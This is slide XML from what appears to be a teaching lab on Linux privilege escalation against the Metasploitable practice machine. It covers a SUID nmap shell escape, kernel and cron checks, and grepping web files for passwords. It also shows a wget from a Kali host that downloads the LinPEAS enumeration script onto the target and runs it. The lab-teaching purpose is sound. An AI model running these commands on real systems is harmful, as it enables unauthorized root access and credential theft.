              <a:latin typeface="+mj-lt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+mj-lt"/>
              </a:rPr>
              <a:t>💣 Exploit SUID </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="+mj-lt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</a:rPr>
              <a:t>Older versions of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> allow interactive shell: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solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> –interactive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</a:rPr>
              <a:t>Then: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rgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>sh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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</a:rPr>
              <a:t>👉 Boom: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</a:rPr>
              <a:t>root shell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+mj-lt"/>
              </a:rPr>
              <a:t>Kernel Exploit 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</a:rPr>
              <a:t>Check kernel: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+mj-lt"/>
              </a:rPr>
              <a:t>uname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -a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</a:rPr>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> usually runs an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>old vulnerable kernel</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"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5" y="2897444"/>
            <a:ext cx="5338342" cy="1674556"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom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63492" y="228600"/>
            <a:ext cx="4585854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+mj-lt"/>
              </a:rPr>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Cron</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Jobs</a:t>
            </a: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j-lt"/>
              </a:rPr>
              <a:t>cat /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>crontab</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRP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+mj-lt"/>
              </a:rPr>
              <a:t>🔑 4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>optional </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Credentials Hunting</a:t>
            </a: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+mj-lt"/>
              </a:rPr>
              <a:t>grep</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> password /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/www -r</a:t>
            </a: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j-lt"/>
              </a:rPr>
              <a:t>👉 Web apps often leak creds</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3682649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0396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+mj-lt"/>
              </a:rPr>
              <a:t>Step 4 — Check World-Writable Files in /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>etc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latin typeface="+mj-lt"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Look for files anyone can modify.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>find /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> -type f -perm -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>o+w</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 2&gt;/dev/null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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>⚠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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Why This Matters</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="B61264"/>
              </a:solidFill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+mj-lt"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>If sensitive files are writable, attackers may modify system configurations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modify users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt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Add root user 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Change passwords</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>got </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>no output  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1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US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>There are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>NO world-writable files in /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1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+mj-lt"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Part 2 — Automated Enumeration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Manual enumeration can miss things, so use automation tools.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Step 1 — Upload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>LinPEAS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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LinPEAS.sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Linux privilege escalation enumeration script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt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4799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70866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+mj-lt"/>
              </a:rPr>
              <a:t>👉 In simple words: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+mj-lt"/>
              </a:rPr>
              <a:t>It is a script that automatically checks the system for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>misconfigurations and weaknesses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> that can help you become root.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latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Step 1 — Download on Attacker Machine (Kali simple terminal)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 err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>wget</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh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+mj-lt"/>
              </a:rPr>
              <a:t>The script (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>LinPEAS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> / LSE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>) must exist </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>on the target machine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> to run it.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+mj-lt"/>
              </a:rPr>
              <a:t>What the task actually requires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+mj-lt"/>
              </a:rPr>
              <a:t>The task says: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+mj-lt"/>
              </a:rPr>
              <a:t>“Use scripts like LinPEAS.sh and LSE.sh”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+mj-lt"/>
              </a:rPr>
              <a:t>That means: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+mj-lt"/>
              </a:rPr>
              <a:t>Run the script on the target machine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+mj-lt"/>
              </a:rPr>
              <a:t>The Reality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+mj-lt"/>
              </a:rPr>
              <a:t>But the target machine (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>does NOT have </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>LinPEAS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> installed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>.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+mj-lt"/>
              </a:rPr>
              <a:t>So you must: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+mj-lt"/>
              </a:rPr>
              <a:t>Get the script onto the target → THEN run it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+mj-lt"/>
              </a:rPr>
              <a:t>Running </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>LinPEAS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> on Kali = ❌ Wrong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+mj-lt"/>
              </a:rPr>
              <a:t>Running </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>LinPEAS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> on Target = ✅ Correct</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18291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777345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+mj-lt"/>
              </a:rPr>
              <a:t>Transfer to the target machine.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Simple method (if Python server):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# On Kali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python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 8000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# On </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> (target shell from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>) :</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>www-data@metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>:$ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>wget</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> http://&lt;kali-ip&gt;:8000/linpeas.sh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70C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> +x linpeas.sh</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>./linpeas.sh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This moves the script from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Kali → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0"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+mj-lt"/>
              </a:rPr>
              <a:t>What does LinPEAS actually do?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+mj-lt"/>
              </a:rPr>
              <a:t>Instead of manually running many commands like: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err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -l</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>find / -perm -u=s -type f</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>find /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -type f -perm -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>o+w</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000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74327" y="169085"/>
            <a:ext cx="6096000" cy="272382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j-lt"/>
              </a:rPr>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>LinPEAS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> runs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>hundreds of checks automatically</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>, such as: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+mj-lt"/>
              </a:rPr>
              <a:t>SUDO misconfigurations              Password leaks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+mj-lt"/>
              </a:rPr>
              <a:t>Environment variables                  SUID binaries                            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+mj-lt"/>
              </a:rPr>
              <a:t>PATH issues                                  Kernel vulnerabilities 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+mj-lt"/>
              </a:rPr>
              <a:t>Writable files                                </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Cron</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> jobs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06398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861964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+mj-lt"/>
              </a:rPr>
              <a:t>Why do you need </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>LinPEAS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> on the target?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+mj-lt"/>
              </a:rPr>
              <a:t>Because: 👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>LinPEAS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> must scan </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>the local system</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1600" dirty="0"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+mj-lt"/>
              </a:rPr>
              <a:t>It needs access to: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+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/home/</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/bin/</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>proc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/       These are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>inside the target machine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>, not on Kali.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1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+mj-lt"/>
              </a:rPr>
              <a:t>Step 2 — Run LinPEAS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+mj-lt"/>
              </a:rPr>
              <a:t>Done on: Metasploitable (Target Machine)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chmod +x linpeas.sh                                                       </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
